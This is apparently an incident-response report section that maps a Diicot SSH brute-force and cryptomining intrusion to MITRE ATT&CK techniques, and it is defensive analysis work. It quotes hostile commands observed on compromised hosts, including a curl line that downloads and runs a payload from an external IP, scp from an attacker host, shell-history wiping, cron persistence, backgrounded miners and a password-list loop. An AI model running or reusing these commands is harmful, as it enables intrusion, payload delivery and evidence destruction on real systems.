# MITRE ATT&CK Mapping

This section provides a structured mapping of adversarial techniques observed during the SSH brute-force campaign attributed to the Diicot threat group, based on the MITRE ATT&CK Framework. Each technique includes relevant identifiers, descriptions of how it was observed in the environment, real examples, and references to findings in `initial-threat-hunt.md`.

---

## Technique: T1110.001 — Brute Force: Password Guessing

**Description:**  
The `.bisis` binary was used to perform mass SSH brute-force login attempts targeting internal and external systems. Over 180,000 connection requests were observed originating from compromised VMs.

**Example Observed:**
```bash
/var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8
```

**Reference:** See Finding #3 in `initial-threat-hunt.md`

---

## Technique: T1059.004 — Command and Scripting Interpreter: Unix Shell

**Description:**  
Numerous bash-based command sequences were observed launching malicious scripts, setting permissions, and initiating persistence routines across compromised devices.

**Example Observed:**
```bash
bash -c "cd /var/tmp/.update-logs ; chmod +x ./.bisis ; ulimit -n 999999 ; cat iplist | ./bisis ssh ..."
```

**Reference:** See Finding #5 in `initial-threat-hunt.md`

---

## Technique: T1036 — Masquerading

**Description:**  
Several malicious binaries were named to resemble legitimate system components or used non-descriptive filenames like `Update`, `History`, `x`, and `cache`, to evade detection and appear benign.

**Example Observed:**
```plaintext
/tmp/cache
/var/tmp/.update-logs/Update
/var/tmp/.update-logs/History
```

**Reference:** See Finding #6 in `initial-threat-hunt.md`

---

## Technique: T1070.004 — Indicator Removal on Host: File Deletion

**Description:**  
Command sequences included steps to clear shell history and delete audit logs in order to erase evidence of compromise and maintain stealth.

**Example Observed:**
```bash
history -c ; rm -rf .bash_history ~/.bash_history ; rm -rf /tmp/cache
```

**Reference:** See Finding #8 in `initial-threat-hunt.md`

---

## Technique: T1021.004 — Remote Services: SSH

**Description:**  
SSH was used extensively for both outbound brute-force attacks and inbound command-and-control connections from known malicious IPs. Several successful connections were made to remote targets.

**Example Observed:**
```plaintext
Inbound and outbound SSH connections tied to `.bisis` brute-force operations and control channels
```

**Reference:** See Findings #3 and #9 in `initial-threat-hunt.md`

---

## Technique: T1564.001 — Hidden Files and Directories

**Description:**  
Malware components were stored and executed from hidden paths such as `/var/tmp/.update-logs`, `/dev/shm/.x`, and used dot-prefixed file names to conceal payloads.

**Example Observed:**
```bash
cd /var/tmp/.update-logs ; ./cache ; ./x ; ./.bisis
```

**Reference:** See Finding #7 in `initial-threat-hunt.md`

---

## Technique: T1078 — Valid Accounts

**Description:**  
Although direct credential theft was not confirmed, multiple internal devices accepted inbound SSH connections, suggesting reuse of compromised credentials across systems.

**Example Observed:**
```plaintext
Inbound SSH connection to jr-linux-vm-test from known compromised IP
```

**Reference:** See Finding #10 in `initial-threat-hunt.md`

---

## Technique: T1053.003 — Scheduled Task/Job: Cron

**Description:**  
Persistence was established using cron jobs that repeatedly executed the `Update` and `.b` files, enabling malware to reinitialize after reboot or scheduled intervals.

**Example Observed:**
```bash
cron ran: /var/tmp/.update-logs/.b ; bash /var/tmp/.update-logs/Update
```

**Reference:** See Finding #11 in `initial-threat-hunt.md`

---

## Technique: T1204.002 — User Execution: Malicious File

**Description:**  
Malicious binaries such as `UpzBUBnv` and `VwIEbFMroMSrleiJ` were executed manually or as part of a dropper chain, often disguised as normal system files.

**Example Observed:**
```plaintext
./UpzBUBnv
/tmp/VwIEbFMroMSrleiJ
```

**Reference:** See Finding #4 in `initial-threat-hunt.md`

---

## Technique: T1496 — Resource Hijacking

**Description:**  
Cryptomining components such as `kuak`, `diicot`, and `cache` consumed system resources to mine cryptocurrency. Execution was often in the background via disowned processes.

**Example Observed:**
```bash
/var/tmp/Documents/.diicot > /dev/null 2>&1 & disown
./cache >/dev/null 2>&1 & disown
```

**Reference:** See Finding #9 in `initial-threat-hunt.md`

---

## Technique: T1105 — Ingress Tool Transfer

**Description:**  
Payloads such as `cache` and `balu` were transferred from external infrastructure using `curl`, `wget`, and SCP. Files were saved into temp directories and made executable.

**Example Observed:**
```bash
curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu ; chmod +x cache ; ./cache
scp attacker@remote:/UpzBUBnv /var/tmp/
```

**Reference:** See Finding #6 in `initial-threat-hunt.md`

---

## Technique: T1046 — Network Service Discovery

**Description:**  
The attacker-generated script performed network scanning, SSH probing, and service enumeration to identify reachable targets internally.

**Example Observed:**
```bash
.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8
```

**Reference:** See Finding #3 in `initial-threat-hunt.md`

---

## Technique: T1003.001 — OS Credential Dumping: Local Accounts

**Description:**  
The `./retea` script generated a list of usernames and created a password dictionary using common patterns, likely to fuel internal brute-force propagation.

**Example Observed:**
```bash
for us in $(cat .usrs) ; do printf "$us 123456\n" >> pass
```

**Reference:** See Finding #12 in `initial-threat-hunt.md`

---

